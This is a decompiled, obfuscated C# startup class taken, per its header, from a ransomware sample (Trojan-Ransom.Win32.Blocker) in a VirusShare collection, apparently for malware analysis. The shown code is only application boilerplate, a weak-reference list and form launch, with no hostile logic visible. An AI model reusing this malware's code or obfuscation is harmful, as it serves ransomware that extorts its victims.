// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Mike, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0C3C1B21-6176-4F76-8617-6E841BF1BB63
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jijv-ebb751dc7e3c832108c788dba95fe8de289d1ee3f6075fc2c3204492b8887788.exe

using \u0002;
using \u0006;
using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace \u0006
{
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal class \u0001 : WindowsFormsApplicationBase
  {
    private static List<WeakReference> \u0001 = new List<WeakReference>();

    [DebuggerNonUserCode]
    static \u0001()
    {
    }

    [DebuggerNonUserCode]
    private static void \u0001(object _param0)
    {
      List<WeakReference> weakReferenceList;
      if (true)
      {
        weakReferenceList = \u0001.\u0001;
        Monitor.Enter((object) weakReferenceList);
      }
      try
      {
        if (\u0001.\u0001.Count == \u0001.\u0001.Capacity)
        {
          int index1 = 0;
          if (false)
            return;
          int num1 = \u0001.\u0001.Count - 1;
          for (int index2 = 0; index2 <= num1; ++index2)
          {
            int num2;
            int num3;
            if (\u0001.\u0001[index2].IsAlive)
            {
              int num4 = index2;
              num3 = index1;
              num2 = num4;
            }
            else
              goto label_13;
label_9:
            if (num2 == num3)
              goto label_11;
label_10:
            \u0001.\u0001[index1] = \u0001.\u0001[index2];
label_11:
            num2 = index1;
            num3 = 1;
            if (num3 != 0)
              index1 = num2 + num3;
            else
              goto label_9;
label_13:
            if (false)
              goto label_10;
          }
          \u0001.\u0001.RemoveRange(index1, \u0001.\u0001.Count - index1);
          \u0001.\u0001.Capacity = \u0001.\u0001.Count;
        }
        \u0001.\u0001.Add(new WeakReference(RuntimeHelpers.GetObjectValue(_param0)));
        if (false)
          ;
      }
      finally
      {
        if (true)
          Monitor.Exit((object) weakReferenceList);
      }
    }

    [STAThread]
    [DebuggerHidden]
    [EditorBrowsable(EditorBrowsableState.Advanced)]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    internal static void \u0001(string[] _param0)
    {
      do
      {
        do
        {
          try
          {
            Application.SetCompatibleTextRenderingDefault(WindowsFormsApplicationBase.UseCompatibleTextRendering);
          }
          finally
          {
          }
        }
        while (false);
        \u0001.Application.Run(_param0);
        do
        {
          if (false)
            ;
        }
        while (false);
      }
      while (false);
    }

    [DebuggerStepThrough]
    public \u0001()
      : base(AuthenticationMode.Windows)
    {
      \u0001.\u0001((object) this);
      this.IsSingleInstance = false;
      this.EnableVisualStyles = true;
      this.SaveMySettingsOnExit = true;
      this.ShutdownStyle = ShutdownMode.AfterMainFormCloses;
    }

    [DebuggerStepThrough]
    void WindowsFormsApplicationBase.\u0001() => this.MainForm = (Form) \u0001.Forms.Mik;
  }
}
